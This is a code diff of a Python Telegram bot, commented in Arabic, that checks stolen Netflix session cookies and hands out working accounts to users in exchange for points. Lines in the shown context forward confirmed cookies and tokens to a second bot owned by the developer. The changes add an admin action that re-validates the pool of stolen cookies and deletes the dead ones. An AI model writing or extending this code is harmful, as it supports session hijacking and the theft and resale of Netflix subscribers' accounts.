@@ -213,7 +213,7 @@ def _threaded_cookies_check(chat_id, netflix_ids, reply_to_message_id, source_na
             safe_send_message(chat_id, res_text, markup)
             time.sleep(1.0)
         else:
-            dead_count += 1  # يتم حذفه وعدم إرساله نهائياً
+            dead_count += 1 
 
         if index % 2 == 0 or index == total_count:
             try:
@@ -446,7 +446,6 @@ def dispense_account_on_button(call):
     response = execute_dispense_logic(chat_id)
     
     if response["status"] == "success":
-        # تخزين مؤقت للـ cookie والـ token في رسالة المستخدم أو بيئة الذاكرة لاستخدامها عند ضغط "نعم"
         bot.send_message(chat_id, response["text"], reply_markup=response["markup"], parse_mode="Markdown")
     elif response["status"] == "no_points":
         bot.send_message(chat_id, "❌ رصيد نقاطك انتهى تماماً!", reply_markup=generate_main_keyboard(chat_id))
@@ -490,7 +489,6 @@ def handle_user_feedback(call):
         except Exception: 
             pass
         
-        # 🚀 التعديل هنا: عند تأكيد المستخدم أن الحساب يعمل، يتم إرسال تفاصيل الكوكيز والتوكن إلى البوت الثاني تلقائياً
         if target_cookie:
             fresh_res = check_netflix_cookie_detailed(target_cookie)
             if fresh_res:
@@ -503,7 +501,6 @@ def handle_user_feedback(call):
                     f"🍪 **Cookie:**\n`NetflixId={target_cookie}`"
                 )
                 try:
-                    # الإرسال عبر البوت الثاني للرقم أو القناة أو المطور (يمكنك تعديله لأي أيدي تريده، هنا أرسلناه لمطور البوت أو نفس الـ ID)
                     second_bot.send_message(DEVELOPER_CHAT_ID, second_bot_msg, parse_mode="Markdown")
                 except Exception as e:
                     print(f"Error sending to second bot: {e}")
@@ -542,6 +539,7 @@ def handle_user_feedback(call):
 def open_admin_panel_msg(chat_id):
     markup = InlineKeyboardMarkup()
     markup.add(InlineKeyboardButton("📢 إرسال إذاعة جماعية (Broadcast)", callback_data="admin_broadcast"))
+    markup.add(InlineKeyboardButton("🧹 تنظيف المخزن وحذف التالف", callback_data="admin_clean_pool")) # الزر الجديد المضاف لتنظيف المخزن
     markup.add(InlineKeyboardButton("🔄 تصفير الذاكرة والمكرر", callback_data="admin_clear_history"))
     
     stats_text = (
@@ -582,6 +580,41 @@ def process_broadcast_sending(message):
             pass
             
     bot.send_message(DEVELOPER_CHAT_ID, f"✅ تمت الإذاعة بنجاح! تم تسليم الرسالة إلى {sent_count} مستخدم نشط 🚀")
+
+# --- الدالة الخاصة بفحص وتنظيف المخزن وحذف الحسابات التالفة والمتوقفة ---
+@bot.callback_query_handler(func=lambda call: call.data == "admin_clean_pool")
+def clean_pool_manual_action(call):
+    if call.message.chat.id != DEVELOPER_CHAT_ID:
+        return
+    
+    bot.answer_callback_query(call.id, "⏳ جاري فحص جميع حسابات المخزن وحذف التالف منها...")
+    status_msg = bot.send_message(DEVELOPER_CHAT_ID, "🧹 **بدأت عملية فحص وتنظيف المخزن...** يرجى الانتظار.")
+    
+    global VALID_COOKIES_POOL
+    initial_count = len(VALID_COOKIES_POOL)
+    
+    if initial_count == 0:
+        bot.edit_message_text("📦 المخزن فارغ تماماً، لا توجد حسابات لفحصها.", DEVELOPER_CHAT_ID, status_msg.message_id)
+        return
+
+    still_valid = []
+    removed_count = 0
+    
+    for cookie in VALID_COOKIES_POOL:
+        if check_netflix_cookie_detailed(cookie):
+            still_valid.append(cookie)
+        else:
+            removed_count += 1
+            
+    VALID_COOKIES_POOL = still_valid
+    
+    result_text = (
+        f"✅ **تم الانتهاء من تنظيف المخزن بنجاح!**\n\n"
+        f"📊 الحسابات قبل الفحص: {initial_count}\n"
+        f"👑 الحسابات الشغالة المتبقية: {len(VALID_COOKIES_POOL)}\n"
+        f"❌ الحسابات التالفة أو التي توقفت اشتراكاتها وتم حذفها: {removed_count}"
+    )
+    bot.edit_message_text(result_text, DEVELOPER_CHAT_ID, status_msg.message_id)
 
 @bot.callback_query_handler(func=lambda call: call.data == "admin_clear_history")
 def clear_history_action(call):
